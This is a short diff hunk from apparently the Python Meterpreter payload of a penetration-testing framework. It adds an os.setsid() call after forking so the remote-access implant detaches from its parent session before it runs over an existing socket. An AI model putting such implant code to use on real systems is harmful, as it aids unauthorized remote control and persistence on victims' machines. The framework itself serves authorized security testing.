@@ -404,5 +404,7 @@ class PythonMeterpreter(object):
 		return resp
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+	if hasattr(os, 'setsid'):
+		os.setsid()
 	met = PythonMeterpreter(s)
 	met.run()
